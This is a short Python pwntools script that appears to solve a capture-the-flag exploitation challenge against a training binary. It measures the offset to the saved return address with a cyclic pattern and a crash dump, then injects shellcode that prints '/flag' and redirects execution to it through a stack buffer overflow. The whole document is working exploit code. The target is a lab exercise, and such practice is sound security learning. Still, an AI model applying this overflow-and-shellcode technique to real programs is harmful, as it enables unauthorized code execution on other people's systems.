#!/usr/bin/python3
from pwn import *

# Set the machine architecture
context.arch = 'amd64'

# Retrieve the ELF information from the binary and run it
elf = ELF('/challenge/toddlerone_level1.0')
io = elf.process(setuid=False)

# Send some useless bytes as shellcode
io.sendline(b'aaaaaaa')

# Send the payload size to the program in order 
# to compute the buffer size
io.recvuntil(b'Payload size: ')
io.sendline(f"{512}".encode())

# Build and send the payload to the program
# NOTE: cyclic function setup a pattern payload that with
#       cyclic_find can be used to retrieve the distance
#       between buffer and return address
io.sendline(cyclic(512, n=8))
io.wait()
buff_len = cyclic_find(io.corefile.fault_addr, n=8)

# Run the program again
io = elf.process()

# Retrieve the address of the shellcode location
io.recvuntil(b'bytes for shellcode at 0x')
shellcode_addr = int(io.recvuntil(b'!').decode()[:-1], 16)

# Build the shellcode to open the "/flag" file
io.sendline(asm(shellcraft.cat('/flag')))

# Send the payload size to the program
io.recvuntil(b'Payload size:')
io.sendline(f'{buff_len + 8}'.encode())

# Build and send the payload to the program
# NOTE: as return address we set the retrieved location
PAYLOAD = b'A'*(buff_len) + p64(shellcode_addr)
io.recvuntil(b'Send your payload')
io.sendline(PAYLOAD)

# Print the output of the program
print(io.recvall().decode())